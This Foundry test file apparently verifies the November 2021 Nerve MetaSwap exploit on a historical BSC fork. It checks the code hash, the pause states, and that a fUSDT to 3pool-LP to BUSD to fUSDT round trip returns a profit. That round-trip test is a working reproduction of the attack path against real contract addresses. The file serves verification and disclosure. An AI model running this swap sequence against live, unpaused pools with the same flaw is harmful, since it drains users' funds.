// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "forge-std/Test.sol";
import {IERC20, ISwap, IMetaSwap} from "../src/Interfaces.sol";

/// @title Nerve MetaSwap — historical (pre-exploit) fork verification
/// @notice Forked at BSC block 12,653,564 — one block before the Nov-14-2021 attack tx
///         0xEa95925eb0438e04D0D81Dc270a99CA9fA18B94ca8c6e34272fc9e09266fcf1d.
///         Requires an ARCHIVE BSC RPC (set HIST_RPC); otherwise every test skips.
///         Read-only: fork-only execution, nothing broadcast.
///
/// Proves:
///   1. MetaSwap logic at 0xf642f2a6 is byte-identical today and at the exploit block
///      (keccak256(code) unchanged) — the vulnerable code was never fixed on-chain,
///      only paused.
///   2. At the exploit block the metapools were UNPAUSED and a single fUSDT round trip
///      (fUSDT -> 3pool-LP -> BUSD -> fUSDT) returned more fUSDT than it consumed.
///   3. The same entry point today reverts (Pausable: paused).
contract NerveHistoricalTest is Test {
    uint256 constant HIST_BLOCK = 12_653_564;

    address constant POOL3     = 0x1B3771a66ee31180906972580adE9b81AFc5fCDc;
    address constant USTMETA   = 0x2dcCe1586b1664f41C72206900e404Ec3cA130e0;
    address constant FUSDTMETA = 0xd0fBF0A224563D5fFc8A57e4fdA6Ae080EbCf3D3;
    address constant NRVMETA   = 0x96b849a73db2cc769b4Abe770aAb141aAC9014d6;
    address constant IMPL      = 0xf642f2A626a8B732619606C493aBFc2433dd2D35;
    address constant BUSD      = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;
    address constant FUSDT     = 0x049d68029688eAbF473097a2fC38ef61633A3C7A;
    address constant LP3       = 0xf2511b5E4FB0e5E2d123004b672BA14850478C14;

    bytes32 constant IMPL_CODEHASH =
        0xB30d65529d9906806b3F4700f559d1A222C3795D84123e5962d38501b271b797;

    address attacker = makeAddr("attacker");
    uint256 histFork;
    bool histOk;

    function setUp() public {
        string memory rpc = vm.envOr("HIST_RPC", string(""));
        if (bytes(rpc).length > 0) {
            histFork = vm.createSelectFork(rpc, HIST_BLOCK);
            histOk = true;
        }
    }

    function test_impl_code_identical_then_and_now() public {
        if (!histOk) { vm.skip(true); return; }
        assertEq(IMPL.code.length, 23_816, "impl code length");
        assertEq(keccak256(IMPL.code), IMPL_CODEHASH, "deployed code unchanged since exploit");
    }

    function test_metapools_were_unpaused_at_exploit_block() public {
        if (!histOk) { vm.skip(true); return; }
        // the two metapools drained by the Nov-14-2021 attack were UNPAUSED
        assertEq(ISwap(FUSDTMETA).paused(), false);
        assertEq(ISwap(USTMETA).paused(), false);
        // the nrvFUSDT metapool was already paused at this block (separate pool)
        assertEq(ISwap(NRVMETA).paused(), true);
    }

    /// @dev one-shot round trip on the fUSDT metapool at the pre-exploit state.
    ///      fUSDT ->(meta swap) 3pool-LP ->(base pool) BUSD ->(meta swapUnderlying) fUSDT
    function test_roundtrip_profit_at_exploit_block() public {
        if (!histOk) { vm.skip(true); return; }
        uint256 dx = 1_000e6; // 1,000 fUSDT
        // fUSDT (AnyswapV3ERC20) balances mapping lives at storage slot 2
        vm.store(FUSDT, keccak256(abi.encode(attacker, uint256(2))), bytes32(dx));
        assertEq(IERC20(FUSDT).balanceOf(attacker), dx, "fUSDT balance injected");
        vm.startPrank(attacker);
        IERC20(FUSDT).approve(FUSDTMETA, type(uint256).max);
        uint256 lp = IMetaSwap(FUSDTMETA).swap(0, 1, dx, 0, block.timestamp);
        IERC20(LP3).approve(POOL3, type(uint256).max);
        uint256 busd = ISwap(POOL3).removeLiquidityOneToken(lp, 0, 0, block.timestamp);
        IERC20(BUSD).approve(FUSDTMETA, type(uint256).max);
        // underlying index space: 0=fUSDT, 1=BUSD, 2=USDT, 3=USDC (base pool order)
        uint256 back = IMetaSwap(FUSDTMETA).swapUnderlying(1, 0, busd, 0, block.timestamp);
        vm.stopPrank();

        emit log_named_uint("fUSDT in ", dx);
        emit log_named_uint("fUSDT out", back);
        assertGt(back, dx, "round trip must print free fUSDT (vulnerable code)");
    }

    /// @dev the same entry point today is gated by the pause
    function test_same_call_reverts_today() public {
        if (!histOk) { vm.skip(true); return; }
        vm.selectFork(vm.createSelectFork(vm.envOr("BSC_RPC_URL", string("https://bsc-rpc.publicnode.com"))));
        vm.expectRevert(bytes("Pausable: paused"));
        IMetaSwap(FUSDTMETA).swap(0, 1, 1_000e6, 0, block.timestamp);
    }
}
